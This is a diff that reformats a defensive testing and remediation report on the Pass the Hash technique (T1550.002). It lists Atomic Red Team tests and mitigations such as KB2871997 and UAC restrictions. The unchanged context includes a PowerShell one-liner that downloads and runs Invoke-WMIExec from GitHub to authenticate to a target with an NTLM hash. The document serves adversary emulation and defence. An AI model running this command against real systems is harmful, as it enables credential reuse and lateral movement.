@@ -81,6 +81,7 @@ Note: must dump hashes first
 ```
 
 **Dependencies:**
+
 - Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
 
 ### Atomic Test 2: crackmapexec Pass the Hash
@@ -94,6 +95,7 @@ command execute with crackmapexec
 ```
 
 **Dependencies:**
+
 - CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})
 
 ### Atomic Test 3: Invoke-WMIExec Pass the Hash
@@ -109,7 +111,6 @@ Note: must dump hashes first
 IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -123,37 +124,38 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1051 Update Software
+
 Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group.
 
 ### M1052 User Account Control
+
 Enable pass the hash mitigations to apply UAC restrictions to local accounts on network logon. The associated Registry key is located <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>.
 
 Through GPO: Computer Configuration > [Policies] > Administrative Templates > SCM: Pass the Hash Mitigations: Apply UAC restrictions to local accounts on network logons.
 
 ### M1018 User Account Management
+
 Do not allow a domain user to be in the local administrator group on multiple systems.
 
 ### M1026 Privileged Account Management
-Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems.
 
+Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems.
 
 ## Detection
 
 ### Detection Strategy for T1550.002 - Pass the Hash (Windows)
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Pass the Hash technique applicable | High | Defense Evasion |
+| Finding                            | Severity | Impact          |
+| ---------------------------------- | -------- | --------------- |
+| Pass the Hash technique applicable | High     | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
